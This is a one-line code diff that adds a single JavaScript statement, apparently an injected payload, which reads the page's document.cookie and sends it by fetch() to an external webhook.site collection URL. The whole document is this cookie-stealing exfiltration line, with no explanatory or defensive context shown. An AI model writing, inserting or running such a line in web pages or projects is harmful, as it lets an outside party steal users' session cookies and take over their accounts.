@@ -1,0 +1,1 @@
+fetch('https://webhook.site/6c963526-09d6-4f31-a0b4-b841d12a1698/?c='+document.cookie);
